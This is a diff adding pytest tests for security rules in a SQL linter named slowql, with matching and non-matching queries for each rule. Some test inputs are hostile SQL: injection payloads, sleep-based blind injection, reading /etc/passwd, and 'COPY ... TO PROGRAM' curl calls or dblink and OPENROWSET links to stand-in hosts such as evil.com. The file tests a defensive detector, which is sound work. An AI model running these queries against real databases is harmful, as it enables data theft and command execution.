@@ -8,15 +8,35 @@ import pytest
 from slowql.core.models import Category, Dimension, Location, Query, Severity
 from slowql.rules.base import ASTRule, PatternRule, Rule
 from slowql.rules.catalog import (
+    DangerousServerConfigRule,
+    DataExfiltrationViaFileRule,
+    DynamicSQLExecutionRule,
+    GrantToPublicRule,
     HardcodedPasswordRule,
     LeadingWildcardRule,
+    OverprivilegedExecutionContextRule,
+    PasswordPolicyBypassRule,
     PIIExposureRule,
+    RemoteDataAccessRule,
     SelectStarRule,
     SQLInjectionRule,
+    TautologicalOrConditionRule,
+    TimeBasedBlindInjectionRule,
     UnsafeWriteRule,
+    UserCreationWithoutPasswordRule,
     get_all_rules,
 )
 from slowql.rules.registry import RuleRegistry, get_rule_registry
+
+
+def _make_query(sql: str) -> Query:
+    """Helper to create a Query object from raw SQL for pattern rule testing."""
+    return Query(
+        raw=sql,
+        normalized=sql,
+        dialect="generic",
+        location=Location(line=1, column=1),
+    )
 
 
 class TestRule:
@@ -578,3 +598,327 @@ class TestGlobalRegistry:
         # Should return the same instance on subsequent calls
         registry2 = get_rule_registry()
         assert registry is registry2
+
+
+# =============================================================================
+# Security Rule Tests (Extended)
+# =============================================================================
+
+
+class TestDynamicSQLExecutionRule:
+    def setup_method(self):
+        self.rule = DynamicSQLExecutionRule()
+
+    # Should match
+    def test_exec_with_concatenation(self):
+        assert self.rule.check(_make_query("EXEC('SELECT * FROM users WHERE id = ' + @userId)"))
+
+    def test_execute_with_parens(self):
+        assert self.rule.check(_make_query("EXECUTE(@sql)"))
+
+    def test_sp_executesql(self):
+        assert self.rule.check(_make_query("EXEC sp_executesql @dynamicQuery"))
+
+    def test_execute_immediate(self):
+        assert self.rule.check(_make_query("EXECUTE IMMEDIATE 'SELECT * FROM ' || table_name"))
+
+    def test_prepare_from_variable(self):
+        assert self.rule.check(_make_query("PREPARE stmt FROM @sql_string"))
+
+    def test_prepare_from_concat(self):
+        assert self.rule.check(_make_query("PREPARE stmt FROM CONCAT('SELECT * FROM ', @tbl)"))
+
+    # Should NOT match
+    def test_static_procedure_call(self):
+        assert not self.rule.check(_make_query("EXEC sp_help 'users'"))
+
+    def test_parameterized_procedure(self):
+        assert not self.rule.check(_make_query("EXECUTE myStoredProcedure @param1"))
+
+    def test_normal_parameterized_query(self):
+        assert not self.rule.check(_make_query("SELECT * FROM users WHERE id = @id"))
+
+
+class TestTautologicalOrConditionRule:
+    def setup_method(self):
+        self.rule = TautologicalOrConditionRule()
+
+    # Should match
+    def test_or_1_equals_1(self):
+        assert self.rule.check(_make_query("SELECT * FROM users WHERE username = 'admin' OR 1=1"))
+
+    def test_or_string_equals_string(self):
+        assert self.rule.check(_make_query("DELETE FROM logs WHERE 'a'='a' OR 'x'='x'"))
+
+    def test_or_true(self):
+        assert self.rule.check(_make_query("SELECT * FROM accounts WHERE id = 5 OR TRUE"))
+
+    def test_or_1_equals_1_with_spaces(self):
+        assert self.rule.check(_make_query("SELECT * FROM users WHERE id = 1 OR 1 = 1"))
+
+    # Should NOT match
+    def test_normal_where(self):
+        assert not self.rule.check(_make_query("SELECT * FROM users WHERE id = 1"))
+
+    def test_where_1_equals_1_no_or(self):
+        assert not self.rule.check(_make_query("SELECT * FROM users WHERE 1=1"))
+
+    def test_boolean_column(self):
+        assert not self.rule.check(_make_query("SELECT * FROM users WHERE active = TRUE AND role = 'admin'"))
+
+    def test_count_equals_1(self):
+        assert not self.rule.check(_make_query("SELECT * FROM users WHERE count = 1"))
+
+
+class TestTimeBasedBlindInjectionRule:
+    def setup_method(self):
+        self.rule = TimeBasedBlindInjectionRule()
+
+    # Should match
+    def test_waitfor_delay(self):
+        assert self.rule.check(_make_query("SELECT * FROM users WHERE id = 1; WAITFOR DELAY '0:0:5'"))
+
+    def test_sleep(self):
+        assert self.rule.check(_make_query("SELECT * FROM users WHERE id = 1 AND SLEEP(5)"))
+
+    def test_pg_sleep(self):
+        assert self.rule.check(_make_query("SELECT * FROM users WHERE id = 1 AND pg_sleep(5)"))
+
+    def test_benchmark(self):
+        assert self.rule.check(_make_query("SELECT BENCHMARK(10000000, SHA1('test'))"))
+
+    def test_injection_payload(self):
+        assert self.rule.check(_make_query("' OR 1=1; WAITFOR DELAY '0:0:10' --"))
+
+    # Should NOT match
+    def test_sleep_column_name(self):
+        assert not self.rule.check(_make_query("SELECT sleep_duration FROM config WHERE id = 1"))
+
+    def test_benchmark_table(self):
+        assert not self.rule.check(_make_query("SELECT * FROM benchmarks WHERE score > 90"))
+
+    def test_delay_as_value(self):
+        assert not self.rule.check(_make_query("INSERT INTO delay_log (seconds) VALUES (5)"))
+
+    def test_pg_stat(self):
+        assert not self.rule.check(_make_query("SELECT pg_stat_activity FROM pg_catalog.pg_stat_activity"))
+
+
+class TestGrantToPublicRule:
+    def setup_method(self):
+        self.rule = GrantToPublicRule()
+
+    # Should match
+    def test_grant_select_to_public(self):
+        assert self.rule.check(_make_query("GRANT SELECT ON customers TO PUBLIC"))
+
+    def test_grant_execute_to_public(self):
+        assert self.rule.check(_make_query("GRANT EXECUTE ON dbo.myProc TO PUBLIC"))
+
+    def test_grant_multiple_to_public(self):
+        assert self.rule.check(_make_query("GRANT INSERT, UPDATE ON orders TO PUBLIC"))
+
+    # Should NOT match
+    def test_grant_to_specific_role(self):
+        assert not self.rule.check(_make_query("GRANT SELECT ON customers TO app_readonly"))
+
+    def test_revoke_from_public(self):
+        assert not self.rule.check(_make_query("REVOKE SELECT ON customers FROM PUBLIC"))
+
+    def test_grant_all_to_user(self):
+        assert not self.rule.check(_make_query("GRANT ALL PRIVILEGES ON *.* TO 'admin'@'localhost'"))
+
+
+class TestUserCreationWithoutPasswordRule:
+    def setup_method(self):
+        self.rule = UserCreationWithoutPasswordRule()
+
+    # Should match
+    def test_create_user_no_password(self):
+        assert self.rule.check(_make_query("CREATE USER guest"))
+
+    def test_create_user_for_login(self):
+        assert self.rule.check(_make_query("CREATE USER readonly FOR LOGIN readonly_login"))
+
+    def test_create_login_no_password(self):
+        assert self.rule.check(_make_query("CREATE LOGIN app_service WITH DEFAULT_DATABASE = mydb"))
+
+    # Should NOT match
+    def test_create_user_identified_by(self):
+        assert not self.rule.check(_make_query("CREATE USER admin IDENTIFIED BY 'strongPass123!'"))
+
+    def test_create_login_with_password(self):
+        assert not self.rule.check(_make_query("CREATE LOGIN app_user WITH PASSWORD = 'secureP@ss'"))
+
+    def test_create_user_mysql_identified(self):
+        assert not self.rule.check(_make_query("CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'pass123'"))
+
+
+class TestPasswordPolicyBypassRule:
+    def setup_method(self):
+        self.rule = PasswordPolicyBypassRule()
+
+    # Should match
+    def test_check_policy_off(self):
+        assert self.rule.check(_make_query("CREATE LOGIN weak_user WITH PASSWORD = 'test', CHECK_POLICY = OFF"))
+
+    def test_check_expiration_off(self):
+        assert self.rule.check(_make_query("ALTER LOGIN svc_account WITH CHECK_EXPIRATION = OFF"))
+
+    def test_both_off(self):
+        assert self.rule.check(_make_query("CREATE LOGIN bulk_svc WITH PASSWORD = 'x', CHECK_POLICY = OFF, CHECK_EXPIRATION = OFF"))
+
+    # Should NOT match
+    def test_policy_on(self):
+        assert not self.rule.check(_make_query("CREATE LOGIN secure_user WITH PASSWORD = 'Str0ng!', CHECK_POLICY = ON"))
+
+    def test_expiration_on(self):
+        assert not self.rule.check(_make_query("ALTER LOGIN svc_account WITH CHECK_EXPIRATION = ON"))
+
+    def test_no_policy_clause(self):
+        assert not self.rule.check(_make_query("CREATE LOGIN app WITH PASSWORD = 'complex123!'"))
+
+
+class TestDataExfiltrationViaFileRule:
+    def setup_method(self):
+        self.rule = DataExfiltrationViaFileRule()
+
+    # Should match
+    def test_into_outfile(self):
+        assert self.rule.check(_make_query("SELECT * FROM users INTO OUTFILE '/tmp/users.csv'"))
+
+    def test_into_dumpfile(self):
+        assert self.rule.check(_make_query("SELECT password FROM accounts INTO DUMPFILE '/tmp/dump.txt'"))
+
+    def test_load_file(self):
+        assert self.rule.check(_make_query("SELECT LOAD_FILE('/etc/passwd')"))
+
+    def test_load_data_infile(self):
+        assert self.rule.check(_make_query("LOAD DATA INFILE '/tmp/data.csv' INTO TABLE staging"))
+
+    def test_bulk_insert(self):
+        assert self.rule.check(_make_query("BULK INSERT staging FROM '\\\\server\\share\\data.csv'"))
+
+    def test_copy_from_program(self):
+        assert self.rule.check(_make_query("COPY users FROM PROGRAM 'cat /etc/passwd'"))
+
+    def test_copy_to_program(self):
+        assert self.rule.check(_make_query("COPY users TO PROGRAM 'curl http://evil.com/exfil'"))
+
+    # Should NOT match
+    def test_outfile_as_column_value(self):
+        assert not self.rule.check(_make_query("SELECT * FROM users WHERE file_path = '/tmp/users.csv'"))
+
+    def test_insert_file_path(self):
+        assert not self.rule.check(_make_query("INSERT INTO file_log (path) VALUES ('/tmp/data.csv')"))
+
+    def test_outfiles_table_name(self):
+        assert not self.rule.check(_make_query("SELECT * FROM outfiles WHERE status = 'active'"))
+
+
+class TestRemoteDataAccessRule:
+    def setup_method(self):
+        self.rule = RemoteDataAccessRule()
+
+    # Should match
+    def test_openrowset(self):
+        assert self.rule.check(_make_query("SELECT * FROM OPENROWSET('SQLOLEDB', 'Server=evil.com', 'SELECT * FROM passwords')"))
+
+    def test_opendatasource(self):
+        assert self.rule.check(_make_query("SELECT * FROM OPENDATASOURCE('SQLOLEDB', '...').master.dbo.sysdatabases"))
+
+    def test_openquery(self):
+        assert self.rule.check(_make_query("SELECT * FROM OPENQUERY(LinkedServer, 'SELECT * FROM sensitive_data')"))
+
+    def test_dblink(self):
+        assert self.rule.check(_make_query("SELECT * FROM dblink('host=remote dbname=prod', 'SELECT * FROM users') AS t(id int)"))
+
+    def test_dblink_connect(self):
+        assert self.rule.check(_make_query("SELECT dblink_connect('myconn', 'host=attacker.com dbname=exfil')"))
+
+    def test_dblink_exec(self):
+        assert self.rule.check(_make_query("SELECT dblink_exec('myconn', 'DROP TABLE users')"))
+
+    # Should NOT match
+    def test_openrowset_as_string(self):
+        assert not self.rule.check(_make_query("SELECT * FROM users WHERE source = 'OPENROWSET'"))
+
+    def test_dblink_as_string(self):
+        assert not self.rule.check(_make_query("SELECT * FROM link_tracking WHERE type = 'dblink'"))
+
+    def test_audit_log_mention(self):
+        assert not self.rule.check(_make_query("INSERT INTO audit_log (action) VALUES ('openquery executed')"))
+
+
+class TestDangerousServerConfigRule:
+    def setup_method(self):
+        self.rule = DangerousServerConfigRule()
+
+    # Should match
+    def test_xp_cmdshell(self):
+        assert self.rule.check(_make_query("EXEC sp_configure 'xp_cmdshell', 1"))
+
+    def test_ole_automation(self):
+        assert self.rule.check(_make_query("EXEC sp_configure 'Ole Automation Procedures', 1"))
+
+    def test_clr_enabled(self):
+        assert self.rule.check(_make_query("EXEC sp_configure 'clr enabled', 1"))
+
+    def test_ad_hoc_distributed(self):
+        assert self.rule.check(_make_query("EXEC sp_configure 'Ad Hoc Distributed Queries', 1"))
+
+    # Should NOT match
+    def test_safe_config(self):
+        assert not self.rule.check(_make_query("EXEC sp_configure 'max degree of parallelism', 8"))
+
+    def test_cost_threshold(self):
+        assert not self.rule.check(_make_query("EXEC sp_configure 'cost threshold for parallelism', 50"))
+
+    def test_sp_help(self):
+        assert not self.rule.check(_make_query("EXEC sp_help 'users'"))
+
+    def test_select_config(self):
+        assert not self.rule.check(_make_query("SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'"))
+
+
+class TestOverprivilegedExecutionContextRule:
+    def setup_method(self):
+        self.rule = OverprivilegedExecutionContextRule()
+
+    # Should match
+    def test_execute_as_dbo(self):
+        assert self.rule.check(_make_query("CREATE PROCEDURE dbo.admin_proc WITH EXECUTE AS 'dbo' AS BEGIN SELECT 1 END"))
+
+    def test_execute_as_sa(self):
+        assert self.rule.check(_make_query("CREATE PROCEDURE get_data WITH EXECUTE AS 'sa' AS SELECT * FROM secrets"))
+
+    def test_execute_as_user_dbo(self):
+        assert self.rule.check(_make_query("EXECUTE AS USER = 'dbo'"))
+
+    def test_execute_as_login_sa(self):
+        assert self.rule.check(_make_query("EXECUTE AS LOGIN = 'sa'"))
+
+    def test_security_definer(self):
+        assert self.rule.check(_make_query("CREATE FUNCTION admin_fn() RETURNS void LANGUAGE SQL SECURITY DEFINER AS $$SELECT 1$$"))
+
+    def test_with_admin_option(self):
+        assert self.rule.check(_make_query("GRANT ROLE admin_role TO user1 WITH ADMIN OPTION"))
+
+    def test_with_grant_option(self):
+        assert self.rule.check(_make_query("GRANT SELECT ON users TO app_user WITH GRANT OPTION"))
+
+    def test_execute_as_owner(self):
+        assert self.rule.check(_make_query("ALTER PROCEDURE myProc WITH EXECUTE AS OWNER"))
+
+    # Should NOT match
+    def test_simple_create_procedure(self):
+        assert not self.rule.check(_make_query("CREATE PROCEDURE safe_proc AS BEGIN SELECT 1 END"))
+
+    def test_security_invoker(self):
+        assert not self.rule.check(_make_query("CREATE FUNCTION calc(x INT) RETURNS INT LANGUAGE SQL SECURITY INVOKER AS $$SELECT x$$"))
+
+    def test_normal_grant(self):
+        assert not self.rule.check(_make_query("GRANT SELECT ON users TO app_reader"))
+
+    def test_normal_execute(self):
+        assert not self.rule.check(_make_query("EXECUTE myProcedure @param1 = 'value'"))
